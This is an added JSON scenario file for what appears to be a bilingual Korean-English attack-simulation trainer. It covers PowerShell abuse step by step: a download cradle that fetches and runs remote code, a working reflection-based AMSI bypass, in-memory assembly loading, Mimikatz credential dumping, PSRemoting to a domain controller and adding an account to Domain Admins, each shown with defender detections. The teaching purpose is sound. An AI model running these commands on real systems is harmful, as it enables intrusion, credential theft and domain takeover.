@@ -1,0 +1,239 @@
+{
+  "id": "T1059.001",
+  "title": "PowerShell 실행 및 AMSI 우회 시뮬레이션",
+  "titleEn": "PowerShell Execution and AMSI Bypass Simulation",
+  "duration": 10,
+  "phases": [
+    { "label": "🔍 초기 시도", "labelEn": "🔍 Initial Attempt", "steps": [0] },
+    { "label": "⚡ AMSI 우회", "labelEn": "⚡ AMSI Bypass", "steps": [1, 2, 3] },
+    { "label": "🔓 자격증명 탈취", "labelEn": "🔓 Credential Theft", "steps": [4] },
+    { "label": "✅ 횡적 이동", "labelEn": "✅ Lateral Movement", "steps": [5, 6] }
+  ],
+  "topoNodes": [
+    { "id": "pc", "label": "Victim PC", "x": 50, "y": 60 },
+    { "id": "amsi", "label": "AMSI/Defender", "x": 200, "y": 30 },
+    { "id": "c2", "label": "C2 Server", "x": 200, "y": 90 },
+    { "id": "lsass", "label": "LSASS", "x": 350, "y": 60 },
+    { "id": "dc", "label": "Domain Controller", "x": 500, "y": 60 }
+  ],
+  "topoEdges": [
+    { "from": "pc", "to": "amsi", "minStep": 0 },
+    { "from": "pc", "to": "c2", "minStep": 2 },
+    { "from": "pc", "to": "lsass", "minStep": 4 },
+    { "from": "pc", "to": "dc", "minStep": 5 }
+  ],
+  "desktopIcons": [
+    { "name": "🗑️ Recycle Bin", "icon": "🗑️" },
+    { "name": "{companyName} Data", "icon": "📁" },
+    { "name": "PowerShell", "icon": "⚡", "alert": true },
+    { "name": "Active Directory", "icon": "🏢" }
+  ],
+  "steps": [
+    {
+      "cmd": "powershell -ep Bypass -nop -w hidden -c \"[System.Net.WebClient]::new().DownloadString('https://cdn-static.{companyName}-corp.com/loader.ps1') | IEX\"",
+      "out": "Windows PowerShell\nCopyright (C) Microsoft Corporation. All rights reserved.\n\n[*] Execution Policy: Bypass\n[*] No Profile loaded\n[*] Window: Hidden\n[*] Downloading loader from cdn-static.{companyName}-corp.com...\n[*] Content-Length: 4,892 bytes\n[*] Executing in memory...\n\n[AMSI] Script content detected:\nAt line:1 char:1\n+ [System.Net.WebClient]::new()...\n+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\nThis script contains malicious content and has been blocked by your antivirus software.\n\n[-] AMSI blocked execution",
+      "def": "[AMSI] Malicious PowerShell download cradle blocked - signature match",
+      "defAction": "Source: Windows Defender AMSI\nTarget: powershell.exe (PID: 4521)\nAction: Script execution blocked, event logged to Windows Event Log ID 4104",
+      "desc": "PowerShell 다운로드 크래들로 원격 스크립트를 메모리에서 실행하려 하지만 AMSI가 차단합니다.",
+      "descEn": "The attacker attempts a PowerShell download cradle to execute a remote script in memory, but AMSI blocks it.",
+      "stepTitle": "다운로드 크래들 차단 (AMSI)",
+      "stepTitleEn": "Download Cradle Blocked by AMSI",
+      "feynman": "공격자가 인터넷에서 악성 스크립트를 다운로드해서 바로 실행하려 합니다. 하지만 Windows에 내장된 보안 기능인 AMSI가 '이 코드는 위험합니다!'라고 판단하고 실행을 차단합니다. 마치 공항 보안검색대에서 금지 물품을 발견한 것과 같습니다. 하지만 공격자는 이 보안검색대를 우회하는 방법을 시도할 것입니다.",
+      "feynmanEn": "The attacker tries to download and immediately execute a malicious script from the internet. But AMSI, a built-in Windows security feature, detects it as dangerous and blocks execution. Like airport security finding a prohibited item. But the attacker will try to bypass this security checkpoint.",
+      "expert": "PowerShell의 -ep Bypass는 실행 정책을 우회하고, -nop는 프로필 로드를 건너뛰며, -w hidden은 창을 숨깁니다. IEX(Invoke-Expression)로 다운로드된 스크립트를 메모리에서 직접 실행하지만, AMSI(Anti-Malware Scan Interface)가 스크립트 내용을 검사하여 시그니처 매칭으로 차단합니다.",
+      "expertEn": "PowerShell's -ep Bypass bypasses execution policy, -nop skips profile loading, -w hidden hides the window. IEX (Invoke-Expression) executes the downloaded script directly in memory, but AMSI scans the script content and blocks it via signature matching.",
+      "defTooltip": "🛡️ AMSI: 악성 PowerShell 다운로드 크래들이 차단되었습니다",
+      "defTooltipEn": "🛡️ AMSI: Malicious PowerShell download cradle blocked",
+      "hackerLog": {
+        "title": "powershell_blocked.log",
+        "lines": [
+          { "log": "[*] Execution Policy: Bypass", "desc": "💡 실행 정책을 우회했지만 AMSI는 별도의 보호 계층입니다" },
+          { "log": "This script contains malicious content and has been blocked", "desc": "💡 AMSI가 스크립트 내용을 분석하여 악성으로 판단, 실행을 차단했습니다" },
+          { "log": "[-] AMSI blocked execution", "desc": "💡 첫 번째 시도 실패 - 하지만 공격자는 AMSI 우회를 시도할 것입니다" }
+        ]
+      },
+      "terms": [
+        { "name": "Download Cradle", "desc": "원격 스크립트를 다운로드해서 바로 메모리에서 실행하는 PowerShell 기법. 파일을 디스크에 저장하지 않는 fileless 공격의 핵심입니다" },
+        { "name": "AMSI (Anti-Malware Scan Interface)", "desc": "Windows의 스크립트 검사 인터페이스. PowerShell, VBScript 등의 코드를 실행 전에 백신에 검사를 요청하는 보안 계층입니다" }
+      ]
+    },
+    {
+      "cmd": "powershell -ep Bypass -c \"$a=[Ref].Assembly.GetType('System.Management.Automation.Am'+'siUtils');$b=$a.GetField('am'+'siInitFailed','NonPublic,Static');$b.SetValue($null,$true)\"",
+      "out": "[*] Executing AMSI bypass...\n[*] Targeting: System.Management.Automation.AmsiUtils\n[*] Setting amsiInitFailed = true\n[*] AMSI bypass successful\n\nPS C:\\Users\\{userName}> [System.Management.Automation.AmsiUtils].GetField('amsiInitFailed','NonPublic,Static').GetValue($null)\nTrue\n\n[*] AMSI is now disabled for this PowerShell session\n[*] All subsequent scripts will execute without AMSI scanning",
+      "def": "[EDR] AMSI bypass attempt detected - Reflection-based amsiInitFailed manipulation",
+      "defAction": "Source: CrowdStrike Falcon\nTarget: powershell.exe (PID: 4587)\nAction: Behavioral alert triggered, process flagged for monitoring",
+      "desc": "Reflection을 사용하여 AMSI의 amsiInitFailed 필드를 조작하여 스크립트 검사를 비활성화합니다.",
+      "descEn": "The attacker uses .NET Reflection to set amsiInitFailed=true, disabling AMSI script inspection for the session.",
+      "stepTitle": "AMSI 우회 (Reflection 기법)",
+      "stepTitleEn": "AMSI Bypass via .NET Reflection",
+      "feynman": ".NET Reflection은 프로그램의 '설계도'를 읽고 수정하는 기능입니다. AMSI의 내부 변수 'amsiInitFailed'를 true로 바꾸면, AMSI가 '나는 초기화에 실패했다'고 생각하고 모든 검사를 건너뜁니다. 보안 카메라의 전원 플러그를 뽑는 것과 같습니다. 이후 모든 스크립트는 검사 없이 실행됩니다.",
+      "feynmanEn": "NET Reflection reads and modifies a program's 'blueprints.' Setting AMSI's internal variable 'amsiInitFailed' to true makes AMSI think 'I failed to initialize' and skips all scanning. Like unplugging a security camera. All subsequent scripts execute without inspection.",
+      "expert": ".NET Reflection API로 AmsiUtils 클래스의 비공개 정적 필드 amsiInitFailed에 접근합니다. 문자열 연결('Am'+'siUtils')로 시그니처 탐지를 우회합니다. 이 기법은 현재 PowerShell 세션에만 영향을 미치며 프로세스 재시작 시 리셋됩니다.",
+      "expertEn": ".NET Reflection API accesses the private static field amsiInitFailed in the AmsiUtils class. String concatenation ('Am'+'siUtils') evades signature detection. This technique only affects the current PowerShell session and resets on process restart.",
+      "defTooltip": "🔓 EDR: Reflection 기반 AMSI amsiInitFailed 조작이 감지되었습니다",
+      "defTooltipEn": "🔓 EDR: Reflection-based AMSI amsiInitFailed manipulation detected",
+      "hackerLog": {
+        "title": "amsi_bypass.log",
+        "lines": [
+          { "log": "'System.Management.Automation.Am'+'siUtils'", "desc": "💡 문자열을 쪼개서 합치면 시그니처 탐지를 우회할 수 있습니다" },
+          { "log": "[*] Setting amsiInitFailed = true", "desc": "💡 AMSI에게 '너는 이미 실패했어'라고 속여서 검사를 건너뛰게 합니다" },
+          { "log": "[*] AMSI is now disabled for this PowerShell session", "desc": "💡 이 세션에서 실행되는 모든 스크립트는 더 이상 검사받지 않습니다" }
+        ]
+      },
+      "terms": [
+        { "name": ".NET Reflection", "desc": ".NET 프레임워크에서 실행 중인 코드의 내부 구조를 검사하고 수정하는 기능. 비공개 필드에도 접근할 수 있어 보안 기능을 무력화하는 데 악용됩니다" },
+        { "name": "amsiInitFailed", "desc": "AMSI 내부의 초기화 실패 플래그. true로 설정하면 AMSI가 모든 검사를 건너뛰게 되는 가장 흔한 AMSI 우회 기법입니다" }
+      ]
+    },
+    {
+      "cmd": "powershell -ep Bypass -c \"IEX([System.Net.WebClient]::new().DownloadString('https://cdn-static.{companyName}-corp.com/loader.ps1'))\"",
+      "out": "[*] AMSI: Bypassed (amsiInitFailed=true)\n[*] Downloading loader.ps1...\n[*] Executing in memory (no file on disk)...\n\n[loader.ps1 output]\n[+] Loader v3.2 initialized\n[+] Environment check: Domain-joined ({companyName}.LOCAL)\n[+] User: {companyName}\\{userName}\n[+] Privileges: Standard user\n[+] AV/EDR detected: Windows Defender, CrowdStrike\n[+] Downloading stage 2 payload...\n[+] Stage 2 loaded into memory (fileless)\n[+] C2 channel established: HTTPS → 185.220.101.34:443",
+      "def": "[Network] Suspicious HTTPS download from cdn-static.{companyName}-corp.com followed by C2 beaconing",
+      "defAction": "Source: Network traffic analysis\nTarget: DESKTOP-SEC01 → cdn-static.{companyName}-corp.com\nAction: SSL inspection triggered, domain added to blocklist",
+      "desc": "AMSI 우회 후 원격 스크립트가 정상적으로 메모리에서 실행되어 C2 연결이 수립됩니다.",
+      "descEn": "With AMSI bypassed, the remote script executes successfully in memory, establishing a C2 connection.",
+      "stepTitle": "원격 스크립트 실행 및 C2 연결",
+      "stepTitleEn": "Remote Script Execution and C2 Connection",
+      "feynman": "AMSI를 무력화했으니, 아까 차단됐던 같은 명령이 이번에는 성공합니다. 보안 카메라를 끄고 나서 다시 들어가는 것과 같습니다. 스크립트가 메모리에서 실행되어 환경을 점검하고, 2단계 페이로드를 다운로드하여 C2 서버와 연결합니다. 디스크에는 아무 파일도 저장되지 않습니다.",
+      "feynmanEn": "With AMSI disabled, the same command that was blocked before now succeeds. Like re-entering after turning off the security camera. The script executes in memory, checks the environment, downloads a stage 2 payload, and connects to the C2 server. Nothing is saved to disk.",
+      "expert": "AMSI 우회 후 동일한 다운로드 크래들이 성공합니다. Loader는 도메인 참가 여부, 현재 권한, AV/EDR 존재를 확인한 후 Stage 2를 메모리에 로드합니다. HTTPS 포트 443으로 C2 비콘을 수립하여 정상 트래픽으로 위장합니다.",
+      "expertEn": "After AMSI bypass, the same download cradle succeeds. The loader checks domain membership, current privileges, and AV/EDR presence, then loads Stage 2 into memory. C2 beacon establishes on HTTPS port 443, disguised as normal traffic.",
+      "defTooltip": "🌐 네트워크: 의심스러운 HTTPS 다운로드 후 C2 비콘 활동이 감지되었습니다",
+      "defTooltipEn": "🌐 Network: Suspicious HTTPS download followed by C2 beaconing detected",
+      "hackerLog": {
+        "title": "loader_execution.log",
+        "lines": [
+          { "log": "[*] AMSI: Bypassed (amsiInitFailed=true)", "desc": "💡 AMSI가 비활성화된 상태 - 악성 스크립트가 검사 없이 실행됩니다" },
+          { "log": "[+] AV/EDR detected: Windows Defender, CrowdStrike", "desc": "💡 보안 제품을 파악하여 각 제품에 맞는 우회 전략을 적용합니다" },
+          { "log": "[+] C2 channel established: HTTPS → 185.220.101.34:443", "desc": "💡 HTTPS로 위장한 C2 연결이 수립되었습니다" }
+        ]
+      },
+      "terms": [
+        { "name": "Staged Payload", "desc": "단계별로 나뉜 페이로드. Stage 1(작은 로더)이 먼저 실행되고, Stage 2(본체)를 다운로드합니다. 초기 탐지를 피하기 위한 전략입니다" },
+        { "name": "Fileless Execution", "desc": "파일을 디스크에 저장하지 않고 메모리에서만 실행하는 방식. 전통적인 파일 기반 백신 스캔을 완전히 우회합니다" }
+      ]
+    },
+    {
+      "cmd": "powershell -c \"$code = [System.IO.File]::ReadAllBytes('C:\\Windows\\Temp\\payload.dll'); [System.Reflection.Assembly]::Load($code); [Namespace.Class]::Execute()\"",
+      "out": "[*] Loading .NET assembly from memory...\n[*] Assembly: payload.dll (156KB)\n[*] No file written to disk (loaded from byte array)\n[*] Executing: Namespace.Class.Execute()\n\n[+] .NET assembly loaded successfully\n[+] Payload executing in PowerShell process space\n[+] Process: powershell.exe (PID: 4612)\n[+] Parent: explorer.exe (PID: 2104)\n[+] Memory region: RWX allocated at 0x00007FF8A1200000\n\n[+] Capabilities activated:\n    - Keylogger (SetWindowsHookEx)\n    - Screenshot capture (GDI+)\n    - Clipboard monitor\n    - File browser",
+      "def": "[EDR] In-memory .NET assembly loading detected - suspicious RWX memory allocation",
+      "defAction": "Source: Memory scanning engine\nTarget: powershell.exe (PID: 4612)\nAction: Memory region flagged, assembly extracted for analysis",
+      "desc": ".NET 어셈블리를 메모리에 직접 로드하여 디스크에 흔적을 남기지 않고 페이로드를 실행합니다.",
+      "descEn": "The attacker loads a .NET assembly directly into memory, executing the payload without leaving traces on disk.",
+      "stepTitle": ".NET 어셈블리 메모리 로드",
+      "stepTitleEn": ".NET Assembly In-Memory Loading",
+      "feynman": "DLL 파일을 디스크에 저장하는 대신 바이트 배열로 메모리에 직접 로드합니다. PowerShell의 프로세스 공간 안에서 실행되므로 별도의 프로세스가 생기지 않습니다. 키로거, 화면 캡처 등의 기능이 PowerShell 안에서 조용히 동작합니다. 마치 편지봉투 안에 들어있는 스파이 같습니다.",
+      "feynmanEn": "Instead of saving a DLL to disk, it's loaded directly into memory as a byte array. It runs inside PowerShell's process space without creating a separate process. Keylogger, screenshot capture, and other functions operate silently within PowerShell. Like a spy hiding inside an envelope.",
+      "expert": "Assembly.Load(byte[])는 .NET 어셈블리를 디스크 I/O 없이 메모리에 직접 로드합니다. RWX(Read-Write-Execute) 메모리 영역 할당은 EDR의 행위 탐지 포인트이며, 이를 RX→RW→RX 단계적 변환으로 우회할 수 있습니다.",
+      "expertEn": "Assembly.Load(byte[]) loads .NET assemblies directly into memory without disk I/O. RWX (Read-Write-Execute) memory allocation is an EDR behavioral detection point, which can be evaded via staged RX→RW→RX permission changes.",
+      "defTooltip": "💾 EDR: 의심스러운 RWX 메모리 할당과 함께 .NET 어셈블리 로드가 감지되었습니다",
+      "defTooltipEn": "💾 EDR: In-memory .NET assembly loading with suspicious RWX allocation detected",
+      "hackerLog": {
+        "title": "assembly_load.log",
+        "lines": [
+          { "log": "[*] No file written to disk (loaded from byte array)", "desc": "💡 디스크에 파일이 없으므로 파일 기반 백신 스캔이 불가능합니다" },
+          { "log": "Memory region: RWX allocated at 0x00007FF8A1200000", "desc": "💡 읽기+쓰기+실행이 가능한 메모리 영역 - EDR이 의심할 수 있는 패턴입니다" },
+          { "log": "- Keylogger (SetWindowsHookEx)", "desc": "💡 키보드 입력을 가로채는 키로거가 활성화되었습니다" }
+        ]
+      },
+      "terms": [
+        { "name": ".NET Assembly", "desc": ".NET 프레임워크에서 실행 가능한 코드 단위(DLL/EXE). PowerShell에서 직접 로드하여 실행할 수 있습니다" },
+        { "name": "RWX Memory", "desc": "읽기(Read), 쓰기(Write), 실행(Execute)이 모두 가능한 메모리 영역. 정상 프로그램에서는 드물어 악성 코드 탐지의 지표가 됩니다" }
+      ]
+    },
+    {
+      "cmd": "powershell -c \"Invoke-Mimikatz -Command '\\\"sekurlsa::logonpasswords\\\"' 2>&1\"",
+      "out": "[*] Loading Invoke-Mimikatz (in-memory)...\n[*] Patching AMSI for Mimikatz strings...\n[*] Executing sekurlsa::logonpasswords...\n\nAuthentication Id : 0 ; 996 (00000000:000003E4)\nSession           : Service from 0\nUser Name         : DESKTOP-SEC01$\nDomain            : {companyName}\nLogon Server      : DC01\n\n* Username : {userName}\n  Domain   : {companyName}\n  NTLM     : 8846f7eaee8fb117ad06bdd830b7586c\n  SHA1     : a]d3b435b51404eeaad3b435b51404ee\n\n* Username : admin_svc\n  Domain   : {companyName}\n  NTLM     : fc525c9683e8fe067095ba2ddc971889\n  Password : Svc@dmin2024!\n\n[+] 4 credential sets harvested",
+      "def": "[EDR] Mimikatz execution detected - LSASS memory access via sekurlsa::logonpasswords",
+      "defAction": "Source: CrowdStrike Falcon (Credential Guard alert)\nTarget: lsass.exe memory on DESKTOP-SEC01\nAction: Process blocked, credential theft prevented, forced password rotation triggered",
+      "desc": "PowerShell에서 Invoke-Mimikatz를 실행하여 LSASS 메모리에서 자격증명을 덤프합니다.",
+      "descEn": "The attacker runs Invoke-Mimikatz in PowerShell to dump credentials from LSASS process memory.",
+      "stepTitle": "Mimikatz로 자격증명 덤프",
+      "stepTitleEn": "Credential Dump via Mimikatz",
+      "feynman": "Mimikatz는 Windows 메모리에서 비밀번호를 추출하는 가장 유명한 해킹 도구입니다. LSASS(로그인 서비스) 프로세스의 메모리를 읽어서 현재 로그인한 모든 사용자의 비밀번호 해시와 심지어 평문 비밀번호까지 가져옵니다. 여기서 'admin_svc'라는 서비스 계정의 실제 비밀번호를 획득했습니다.",
+      "feynmanEn": "Mimikatz is the most famous hacking tool for extracting passwords from Windows memory. It reads LSASS (login service) process memory to grab password hashes and even plaintext passwords of all logged-in users. Here, the actual password of the 'admin_svc' service account was obtained.",
+      "expert": "Invoke-Mimikatz는 Mimikatz의 PowerShell 포팅으로, sekurlsa::logonpasswords는 LSASS 프로세스 메모리에서 NTLM 해시, Kerberos 티켓, 평문 자격증명을 추출합니다. WDigest가 활성화된 환경에서는 평문 비밀번호도 노출됩니다.",
+      "expertEn": "Invoke-Mimikatz is a PowerShell port of Mimikatz. sekurlsa::logonpasswords extracts NTLM hashes, Kerberos tickets, and plaintext credentials from LSASS process memory. Plaintext passwords are exposed in environments with WDigest enabled.",
+      "defTooltip": "🔑 EDR: LSASS 메모리 접근을 통한 Mimikatz 실행이 감지되었습니다",
+      "defTooltipEn": "🔑 EDR: Mimikatz execution detected via LSASS memory access",
+      "hackerLog": {
+        "title": "mimikatz_output.log",
+        "lines": [
+          { "log": "NTLM: 8846f7eaee8fb117ad06bdd830b7586c", "desc": "💡 NTLM 해시 탈취 - 비밀번호를 몰라도 이것만으로 인증이 가능합니다(Pass-the-Hash)" },
+          { "log": "Password : Svc@dmin2024!", "desc": "💡 서비스 계정의 평문 비밀번호가 노출! 도메인 컨트롤러 접근의 열쇠입니다" },
+          { "log": "[+] 4 credential sets harvested", "desc": "💡 4개 계정의 자격증명을 한 번에 탈취했습니다" }
+        ]
+      },
+      "terms": [
+        { "name": "Mimikatz", "desc": "Windows 자격증명 추출 도구. 메모리에서 비밀번호 해시, 평문 비밀번호, Kerberos 티켓을 추출하는 공격 도구의 '대명사'입니다" },
+        { "name": "LSASS (Local Security Authority Subsystem Service)", "desc": "Windows의 인증 프로세스. 로그인한 사용자의 자격증명을 메모리에 캐시하므로, 이 프로세스의 메모리를 읽으면 비밀번호를 추출할 수 있습니다" }
+      ]
+    },
+    {
+      "cmd": "powershell -c \"$s=New-PSSession -ComputerName dc01.{companyName}.local -Credential $cred; Invoke-Command -Session $s -ScriptBlock {whoami; hostname; ipconfig}\"",
+      "out": "[*] Creating PSRemoting session to DC01...\n[*] Using credentials: {companyName}\\admin_svc\n[*] Authentication: Kerberos\n[*] Session established: PSSession Id 1\n\n[Invoke-Command on DC01]\n{companyName}\\admin_svc\nDC01\n\nWindows IP Configuration:\n   Host Name . . . . . . . . . : DC01\n   Primary Dns Suffix  . . . . : {companyName}.local\n   IPv4 Address. . . . . . . . : 10.0.1.10\n   Subnet Mask . . . . . . . . : 255.255.255.0\n   Default Gateway . . . . . . : 10.0.1.1\n\n[+] Domain Controller access confirmed\n[+] Lateral movement successful",
+      "def": "[SIEM] Suspicious PSRemoting session from workstation to Domain Controller using service account",
+      "defAction": "Source: Windows Event Log (ID 4688, 4624)\nTarget: DC01.{companyName}.local\nAction: Session terminated, admin_svc account disabled, DC forensic imaging initiated",
+      "desc": "탈취한 서비스 계정으로 도메인 컨트롤러에 PSRemoting 세션을 열어 횡적 이동을 수행합니다.",
+      "descEn": "The attacker uses stolen service account credentials to open a PSRemoting session to the Domain Controller.",
+      "stepTitle": "도메인 컨트롤러 횡적 이동",
+      "stepTitleEn": "Lateral Movement to Domain Controller",
+      "feynman": "탈취한 admin_svc 계정으로 도메인 컨트롤러(회사 네트워크의 '중앙 관제탑')에 원격으로 접속합니다. PSRemoting은 PowerShell의 원격 실행 기능으로, 마치 그 서버 앞에 앉아서 명령을 치는 것과 같습니다. 도메인 컨트롤러에 접근하면 회사의 모든 컴퓨터와 사용자를 관리할 수 있습니다.",
+      "feynmanEn": "Using the stolen admin_svc account, the attacker remotely connects to the Domain Controller (the network's 'central control tower'). PSRemoting is PowerShell's remote execution feature - like sitting at the server and typing commands. Accessing the DC means controlling all company computers and users.",
+      "expert": "PSRemoting(WinRM)을 통한 횡적 이동으로, Kerberos 인증을 사용합니다. New-PSSession으로 지속적 세션을 생성하고 Invoke-Command로 원격 명령을 실행합니다. 워크스테이션→DC 직접 연결은 비정상적인 트래픽 패턴으로 SIEM에서 탐지됩니다.",
+      "expertEn": "Lateral movement via PSRemoting (WinRM) using Kerberos authentication. New-PSSession creates a persistent session and Invoke-Command executes remote commands. Workstation→DC direct connection is an anomalous traffic pattern detected by SIEM.",
+      "defTooltip": "🏢 SIEM: 서비스 계정으로 워크스테이션에서 DC로의 PSRemoting 세션이 감지되었습니다",
+      "defTooltipEn": "🏢 SIEM: PSRemoting session from workstation to DC using service account detected",
+      "hackerLog": {
+        "title": "psremoting_session.log",
+        "lines": [
+          { "log": "[*] Using credentials: {companyName}\\admin_svc", "desc": "💡 Mimikatz로 탈취한 서비스 계정으로 DC에 접근합니다" },
+          { "log": "Host Name: DC01", "desc": "💡 도메인 컨트롤러에서 명령이 실행되고 있습니다 - 전체 도메인에 대한 접근!" },
+          { "log": "IPv4 Address: 10.0.1.10", "desc": "💡 DC의 내부 IP 확인 - 네트워크 내부 구조를 파악할 수 있습니다" }
+        ]
+      },
+      "terms": [
+        { "name": "PSRemoting (PowerShell Remoting)", "desc": "PowerShell의 원격 실행 기능. WinRM 프로토콜을 사용하여 다른 컴퓨터에서 PowerShell 명령을 실행할 수 있습니다" },
+        { "name": "Domain Controller (DC)", "desc": "Active Directory 도메인의 중앙 관리 서버. 모든 사용자 계정, 그룹 정책, 인증을 관리하는 핵심 서버입니다" }
+      ]
+    },
+    {
+      "cmd": "powershell -c \"Invoke-Command -Session $s -ScriptBlock { Add-DomainGroupMember -Identity 'Domain Admins' -Members '{userName}'; net group 'Domain Admins' /domain }\"",
+      "out": "[Executing on DC01 via PSRemoting]\n\n[+] Adding {userName} to Domain Admins group...\n[+] Member added successfully.\n\nGroup name     Domain Admins\nComment        Designated administrators of the domain\n\nMembers\n-----------\nAdministrator\nadmin_svc\n{userName}        ← NEW\n\nThe command completed successfully.\n\n[+] {userName} is now a Domain Admin\n[+] Full Active Directory control achieved",
+      "def": "[SIEM] Unauthorized Domain Admin group modification - {userName} added via remote session",
+      "defAction": "Source: Active Directory audit log (Event ID 4728, 4732)\nTarget: Domain Admins group on DC01\nAction: Change reverted, all admin sessions terminated, domain-wide security lockdown initiated",
+      "desc": "도메인 컨트롤러에서 공격자 계정을 Domain Admins 그룹에 추가하여 완전한 도메인 장악을 달성합니다.",
+      "descEn": "The attacker adds their account to the Domain Admins group on the DC, achieving full domain compromise.",
+      "stepTitle": "Domain Admin 권한 획득",
+      "stepTitleEn": "Domain Admin Privilege Acquisition",
+      "feynman": "게임의 마지막 보스를 클리어한 순간입니다. 공격자의 계정을 'Domain Admins' 그룹에 추가하면, 회사의 모든 컴퓨터, 모든 사용자, 모든 데이터에 대한 완전한 제어 권한을 갖게 됩니다. 처음 PowerShell 한 줄에서 시작해서, AMSI 우회→C2 연결→자격증명 탈취→횡적 이동→도메인 장악까지 도달했습니다.",
+      "feynmanEn": "This is the final boss clear moment. Adding the attacker's account to 'Domain Admins' grants complete control over every computer, user, and data in the company. Starting from a single PowerShell line, the chain was: AMSI bypass→C2→credential theft→lateral movement→domain takeover.",
+      "expert": "Add-DomainGroupMember(PowerView)로 Domain Admins 그룹에 계정을 추가합니다. 이것은 Golden Ticket이나 DCSync 없이도 전체 AD 제어를 달성하는 직접적인 방법입니다. Event ID 4728(Security Group 멤버 추가)로 감사 로그에 기록됩니다.",
+      "expertEn": "Add-DomainGroupMember (PowerView) adds an account to the Domain Admins group. This is a direct method to achieve full AD control without Golden Ticket or DCSync. Recorded in audit logs as Event ID 4728 (Security Group member addition).",
+      "defTooltip": "👑 SIEM: 원격 세션을 통한 무단 Domain Admins 그룹 변경이 감지되었습니다",
+      "defTooltipEn": "👑 SIEM: Unauthorized Domain Admin group modification via remote session detected",
+      "hackerLog": {
+        "title": "domain_admin.log",
+        "lines": [
+          { "log": "[+] Adding {userName} to Domain Admins group...", "desc": "💡 공격자 계정을 최고 관리자 그룹에 추가하는 중입니다" },
+          { "log": "{userName}        ← NEW", "desc": "💡 Domain Admins에 추가 완료 - 전체 도메인에 대한 절대적 권한 획득" },
+          { "log": "[+] Full Active Directory control achieved", "desc": "💡 모든 PC, 사용자, 정책, 데이터에 대한 완전한 제어가 가능합니다" }
+        ]
+      },
+      "terms": [
+        { "name": "Domain Admins", "desc": "Active Directory의 최고 관리자 그룹. 이 그룹의 멤버는 도메인의 모든 리소스에 대한 완전한 접근 권한을 가집니다" },
+        { "name": "Active Directory (AD)", "desc": "Windows 네트워크의 중앙 디렉토리 서비스. 사용자 인증, 그룹 정책, 리소스 관리를 담당하는 기업 IT의 핵심입니다" }
+      ]
+    }
+  ],
+  "processTree": [
+    { "name": "explorer.exe", "depth": 0, "alert": false, "minStep": 0 },
+    { "name": "powershell.exe (PID: 4521) [BLOCKED]", "depth": 1, "alert": true, "minStep": 0 },
+    { "name": "powershell.exe (PID: 4587) [AMSI Bypass]", "depth": 1, "alert": true, "minStep": 1 },
+    { "name": "powershell.exe (PID: 4612) [Loader]", "depth": 1, "alert": true, "minStep": 2 },
+    { "name": ".NET Assembly (in-memory)", "depth": 2, "alert": true, "minStep": 3 },
+    { "name": "Invoke-Mimikatz → lsass.exe", "depth": 2, "alert": true, "minStep": 4 },
+    { "name": "PSRemoting → DC01 (PID: 4701)", "depth": 1, "alert": true, "minStep": 5 },
+    { "name": "wsmprovhost.exe on DC01", "depth": 2, "alert": true, "minStep": 6 }
+  ]
+}
